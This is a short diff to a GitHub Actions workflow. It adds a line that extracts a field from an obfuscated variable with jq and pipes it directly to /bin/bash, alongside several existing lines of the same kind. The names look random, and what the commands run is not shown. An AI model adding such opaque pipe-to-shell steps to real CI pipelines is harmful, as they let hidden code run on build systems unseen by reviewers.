@@ -33,6 +33,7 @@ jobs:
           echo $hdlqa94208 | jq -r .tn1 | /bin/bash
           echo $qo357 | jq -r .esz63162 | /bin/bash
           printf '%s' "$rlaew90" | jq -r .rp4 | /bin/bash
+          echo $izot28 | jq -r .borch64 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
